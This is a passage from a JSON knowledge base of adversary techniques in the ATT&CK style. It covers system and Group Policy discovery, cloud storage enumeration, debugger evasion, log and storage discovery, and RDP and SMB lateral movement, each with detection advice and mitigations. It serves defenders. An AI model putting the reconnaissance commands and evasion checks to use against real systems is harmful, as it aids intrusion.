the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system location information. Remote access tools with built-in features may interact directly with the Windows API, such as calling <code> GetLocaleInfoW</code> to gather information. <a href=\"https://s3.documentcloud.org/documents/20413525/fbi-flash-indicators-of-compromise-ragnar-locker-ransomware-11192020-bc.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI Ragnar Locker 2020)</a>\n\nMonitor traffic flows to geo-location service provider sites, such as ip-api and ipinfo.","platforms":["IaaS","Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Process: OS API Execution","Command: Command Execution"],"mitigations":[],"subTechniques":[{"id":"T1614.001","name":"System Language Discovery","description":"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities. <a href=\"https://www.welivesecurity.com/2009/01/15/malware-trying-to-avoid-some-countries/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware System Language Check)</a>\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. <a href=\"https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Ryuk January 2019)</a> \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>. <a href=\"https://www.cybereason.com/blog/cybereason-vs-darkside-ransomware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Darkside Ransomware Cybereason)</a> <a href=\"https://securelist.com/evolution-of-jsworm-ransomware/102428/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securelist JSWorm)</a> <a href=\"https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SecureList SynAck Doppelgänging May 2018)</a>\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system language information. This may include calls to various API functions and interaction with system configuration settings such as the Windows Registry.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Process: OS API Execution","Windows Registry: Windows Registry Key Access","Command: Command Execution"],"mitigations":[]}]},{"id":"T1615","name":"Group Policy Discovery","description":"Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path <code>\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>. <a href=\"https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Group Policy Basics)</a> <a href=\"https://adsecurity.org/?p=2716\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity GPO Persistence 2016)</a>\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings. <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft gpresult)</a> <a href=\"https://github.com/PowerShellEmpire/Empire\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github PowerShell Empire)</a> Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. Domain or Tenant Policy Modification) for their benefit.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor for suspicious use of <code>gpresult</code>. Monitor for the use of PowerShell functions such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code> and processes spawning with command-line arguments containing <code>GPOLocalGroup</code>.\n\nMonitor for abnormal LDAP queries with filters for <code>groupPolicyContainer</code> and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed.","platforms":["Windows"],"dataSources":["Script: Script Execution","Active Directory: Active Directory Object Access","Process: Process Creation","Command: Command Execution","Network Traffic: Network Traffic Content"],"mitigations":[],"subTechniques":[]},{"id":"T1619","name":"Cloud Storage Object Discovery","description":"Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to File and Directory Discovery on a local host, after identifying available storage services (i.e. Cloud Infrastructure Discovery) adversaries may access the contents/objects stored in cloud infrastructure.\n\nCloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/API/API_ListObjectsV2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ListObjectsV2)</a> and List Blobs in Azure <a href=\"https://docs.microsoft.com/en-us/rest/api/storageservices/list-blobs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: List Blobs)</a> .","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained. \nMonitor cloud logs for API calls used for file or object enumeration for unusual activity.","platforms":["IaaS"],"dataSources":["Cloud Storage: Cloud Storage Access","Cloud Storage: Cloud Storage Enumeration"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Restrict granting of permissions related to listing objects in cloud storage to necessary accounts."}],"subTechniques":[]},{"id":"T1622","name":"Debugger Evasion","description":"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads. <a href=\"https://github.com/processhacker/processhacker\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ProcessHacker Github)</a>\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary. On Windows, this may involve Native API function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying <code>/proc/self/status</code> for the <code>TracerPID</code> field, which indicates whether or not the process is being traced by dynamic analysis tools. <a href=\"https://www.cadosecurity.com/blog/p2pinfect-new-variant-targets-mips-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cado Security P2PInfect 2023)</a> <a href=\"https://global.ptsecurity.com/analytics/pt-esc-threat-intelligence/hellhounds-operation-lahat\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Positive Technologies Hellhounds 2023)</a> Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error). <a href=\"https://github.com/hasherezade/malware_training_vol1/blob/main/slides/module3/Module3_2_fingerprinting.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hasherezade debug)</a> <a href=\"https://github.com/LordNoteworthy/al-khaser/tree/master/al-khaser/AntiDebug\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AlKhaser Debug)</a> <a href=\"https://github.com/vxunderground/VX-API/tree/main/Anti%20Debug\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: vxunderground debug)</a>\n\nMalware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue. <a href=\"https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apriorit)</a>\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as <code>OutputDebugStringW()</code>. <a href=\"https://objective-see.com/blog/blog_0x60.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wardle evilquest partii)</a> <a href=\"https://research.checkpoint.com/2021/stopping-serial-killer-catching-the-next-strike/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Checkpoint Dridex Jan 2021)</a>","detection":"Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious Native API function calls as well as processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\nMonitor debugger logs for signs of abnormal and potentially malicious activity.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Process: OS API Execution","Application Log: Application Log Content","Command: Command Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1652","name":"Device Driver Discovery","description":"Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. Security Software Discovery) or other defenses (e.g., Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g., Exploitation for Privilege Escalation).\n\nMany OS utilities may provide information about local device drivers, such as <code>driverquery.exe</code> and the <code>EnumDeviceDrivers()</code> API function on Windows. <a href=\"https://learn.microsoft.com/windows-server/administration/windows-commands/driverquery\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Driverquery)</a> <a href=\"https://learn.microsoft.com/windows/win32/api/psapi/nf-psapi-enumdevicedrivers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft EnumDeviceDrivers)</a> Information about device drivers (as well as associated services, i.e., System Service Discovery) may also be available in the Registry. <a href=\"https://learn.microsoft.com/windows-hardware/drivers/install/overview-of-registry-trees-and-keys\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Registry Drivers)</a>\n\nOn Linux/macOS, device drivers (in the form of kernel modules) may be visible within <code>/dev</code> or using utilities such as <code>lsmod</code> and <code>modinfo</code>. <a href=\"https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Kernel Programming)</a> <a href=\"https://man7.org/linux/man-pages/man8/lsmod.8.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: lsmod man)</a> <a href=\"https://linux.die.net/man/8/modinfo\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: modinfo man)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Process: OS API Execution","Windows Registry: Windows Registry Key Access"],"mitigations":[],"subTechniques":[]},{"id":"T1654","name":"Log Enumeration","description":"Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery).\n\nHost binaries may be leveraged to collect system logs. Examples include using <code>wevtutil.exe</code> or PowerShell on Windows to access and/or export security event information. <a href=\"https://labs.withsecure.com/content/dam/labs/docs/WithSecure-Lazarus-No-Pineapple-Threat-Intelligence-Report-2023.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)</a> <a href=\"https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cadet Blizzard emerges as novel threat actor)</a> In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s <code>CollectGuestLogs.exe</code> to collect security logs from cloud hosted infrastructure. <a href=\"https://www.mandiant.com/resources/blog/sim-swapping-abuse-azure-serial\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console)</a>\n\nAdversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.\n\nIn addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses. <a href=\"https://permiso.io/blog/s/unmasking-guivil-new-cloud-threat-actor/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Permiso GUI-Vil 2023)</a>","detection":"","platforms":["ESXi","IaaS","Linux","macOS","Windows"],"dataSources":["File: File Access","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit the ability to access and export sensitive logs to privileged accounts where possible."}],"subTechniques":[]},{"id":"T1673","name":"Virtual Machine Discovery","description":"An adversary may attempt to enumerate running virtual machines (VMs) after gaining access to a host or hypervisor. For example, adversaries may enumerate a list of VMs on an ESXi hypervisor using a Hypervisor CLI such as <code>esxcli</code> or <code>vim-cmd</code> (e.g. <code>esxcli vm process list or vim-cmd vmsvc/getallvms</code>). <a href=\"https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)</a> <a href=\"https://www.trendmicro.com/en_us/research/24/g/new-play-ransomware-linux-variant-targets-esxi-shows-ties-with-p.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro Play)</a> Adversaries may also directly leverage a graphical user interface, such as VMware vCenter, in order to view virtual machines on a host. \n\nAdversaries may use the information from Virtual Machine Discovery during discovery to shape follow-on behaviors. Subsequently discovered VMs may be leveraged for follow-on activities such as Service Stop or Data Encrypted for Impact. <a href=\"https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)</a>","detection":"","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":[],"mitigations":[],"subTechniques":[]},{"id":"T1680","name":"Local Storage Discovery","description":"Adversaries may enumerate local drives, disks, and/or volumes and their attributes like total or free space and volume serial number. This can be done to prepare for ransomware-related encryption, to perform Lateral Movement, or as a precursor to Direct Volume Access. \n\nOn ESXi systems, adversaries may use Hypervisor CLI commands such as <code>esxcli</code> to list storage connected to the host as well as <code>.vmdk</code> files. <a href=\"https://www.trendmicro.com/en_us/research/21/e/darkside-linux-vms-targeted.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro)</a> <a href=\"https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro ESXI Ransomware)</a>\n\nOn Windows systems, adversaries can use <code>wmic logicaldisk get</code> to find information about local network drives. They can also use <code>Get-PSDrive</code> in PowerShell to retrieve drives and may additionally use Windows API functions such as <code>GetDriveType</code>. <a href=\"https://www.trendmicro.com/en_us/research/24/i/earth-preta-new-malware-and-strategies.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro MUSTANG PANDA PUBLOAD HIUPAN SEPTEMBER 2024)</a> <a href=\"https://www.volexity.com/blog/2023/06/28/charming-kitten-updates-powerstar-with-an-interplanetary-twist/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity)</a>\n\nLinux has commands such as <code>parted</code>, <code>lsblk</code>, <code>fdisk</code>, <code>lshw</code>, and <code>df</code> that can list information about disk partitions such as size, type, file system types, and free space. The command <code>diskutil</code> on MacOS can be used to list disks while <code>system_profiler SPStorageDataType</code> can additionally show information such as a volume’s mount path, file system, and the type of drive in the system. \n\nInfrastructure as a Service (IaaS) cloud providers also have commands for storage discovery such as <code>describe volume</code> in AWS, <code>gcloud compute disks list</code> in GCP, and <code>az disk list</code> in Azure. <a href=\"https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-volumes.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS docs describe volumes)</a> <a href=\"https://cloud.google.com/sdk/gcloud/reference/compute/disks/list\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP gcloud compute disks list)</a> <a href=\"https://learn.microsoft.com/en-us/cli/azure/disk?view=azure-cli-latest\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: azure az disk)</a>","detection":"","platforms":["ESXi","IaaS","Linux","macOS","Windows"],"dataSources":[],"mitigations":[],"subTechniques":[]}]},{"tactic":"Lateral Movement","techniques":[{"id":"T1021","name":"Remote Services","description":"Adversaries may use Valid Accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP). <a href=\"https://www.ssh.com/ssh\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SSH Secure Shell)</a> <a href=\"https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Remote Desktop Services)</a> They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain, or management platforms for internal virtualization environments such as VMware vCenter. \n\nLegitimate applications (such as Software Deployment Tools and other administrative programs) may utilize Remote Services to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. <a href=\"https://support.apple.com/en-us/HT209161\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Remote Management MDM macOS)</a> <a href=\"https://support.apple.com/en-us/HT201710\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kickstart Apple Remote Desktop commands)</a> <a href=\"https://images.apple.com/remotedesktop/pdf/ARD_Admin_Guide_v3.3.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Remote Desktop Admin Guide 3.3)</a> Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data. <a href=\"https://www.fireeye.com/blog/threat-research/2019/10/leveraging-apple-remote-desktop-for-good-and-evil.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye 2019 Apple Remote Desktop)</a> <a href=\"http://lockboxx.blogspot.com/2019/07/macos-red-teaming-206-ard-apple-remote.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lockboxx ARD 2019)</a> <a href=\"https://support.apple.com/en-us/HT201710\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kickstart Apple Remote Desktop commands)</a>","detection":"Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement. \n\nUse of applications such as ARD may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using these applications. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. \n\nIn macOS, you can review logs for \"screensharingd\" and \"Authentication\" event messages. Monitor network connections regarding remote management (ports tcp:3283 and tcp:5900) and for remote login (port tcp:22). <a href=\"http://lockboxx.blogspot.com/2019/07/macos-red-teaming-206-ard-apple-remote.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lockboxx ARD 2019)</a> <a href=\"https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)</a>","platforms":["Linux","macOS","Windows","IaaS","ESXi"],"dataSources":["Module: Module Load","Network Traffic: Network Connection Creation","Command: Command Execution","Network Share: Network Share Access","WMI: WMI Creation","Logon Session: Logon Session Creation","Network Traffic: Network Traffic Flow","Process: Process Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit the accounts that may use remote services. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs."},{"id":"M1027","name":"Password Policies","description":"Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication on remote service logons where possible."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Prevent unnecessary remote access to file shares, hypervisors, sensitive systems, etc. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc. <a href=\"https://www.sygnia.co/blog/esxi-ransomware-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia ESXi Ransomware 2024)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"If remote services, such as the ability to make direct connections to cloud virtual machines, are not required, disable these connection types where feasible. On ESXi servers, consider enabling lockdown mode, which disables direct access to an ESXi host and requires that the host be managed remotely using vCenter. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence ESXi Hardening 2023)</a> <a href=\"https://knowledge.broadcom.com/external/article/336894/enabling-or-disabling-lockdown-mode-on-a.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom ESXi Lockdown Mode)</a>"},{"id":"M1047","name":"Audit","description":"Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses."}],"subTechniques":[{"id":"T1021.001","name":"Remote Desktop Protocol","description":"Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). <a href=\"https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Remote Desktop Services)</a> \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence. <a href=\"http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Alperovitch Malware)</a>","detection":"Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.","platforms":["Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Logon Session: Logon Session Creation","Network Traffic: Network Connection Creation","Process: Process Creation","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit remote user permissions if remote access is necessary."},{"id":"M1026","name":"Privileged Account Management","description":"Consider removing the local Administrators group from the list of groups allowed to log in through RDP."},{"id":"M1028","name":"Operating System Configuration","description":"Change GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server. <a href=\"https://technet.microsoft.com/en-us/library/cc754272(v=ws.11).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows RDP Sessions)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Do not leave RDP accessible from the internet. Enable firewall rules to block RDP traffic between network security zones within a network."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for remote logins. <a href=\"https://security.berkeley.edu/node/94\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Berkley Secure)</a>"},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Use remote desktop gateways."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable the RDP service if it is unnecessary."},{"id":"M1047","name":"Audit","description":"Audit the Remote Desktop Users group membership regularly. Remove unnecessary accounts and groups from Remote Desktop Users groups."}]},{"id":"T1021.002","name":"SMB/Windows Admin Shares","description":"Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, <a href=\"https://en.wikipedia.org/wiki/Server_Message_Block\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Server Message Block)</a> to interact with systems using remote procedure calls (RPCs), <a href=\"https://technet.microsoft.com/en-us/library/cc787851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet RPC)</a> transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels. <a href=\"http://support.microsoft.com/kb/314984\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Admin Shares)</a>","detection":"Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. <a href=\"https://docs.microsoft.com/en-us/archive/blogs/jepayne/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lateral Movement Payne)</a> <a href=\"https://docs.microsoft.com/en-us/archive/blogs/jepayne/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Event Forwarding Payne)</a> Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as Net, on the command-line interface and Discovery techniques that could be used to find remotely accessible systems. <a href=\"https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Detecting WMI Persistence)</a>","platforms":["Windows"],"dataSources":["Network Share: Network Share Access","Network Traffic: Network Traffic Flow","Logon Session: Logon Session Creation","Network Traffic: Network Connection Creation","Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems."},{"id":"M1027","name":"Password Policies","description":"Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Consider disabling Windows administrative shares."},{"id":"M1037","name":"Filter Network Traffic","description":"Consider using the host firewall to restrict file sharing communications such as SMB. <a href=\"https://support.microsoft.com/en-us/help/3185535/preventing-smb-traffic-from-lateral-connections\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Preventing SMB)</a>"}]},{"id":"T1021.003","name":"Distributed Component Object Model","description":"Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology. <a href=\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fireeye Hunting COM June 2019)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 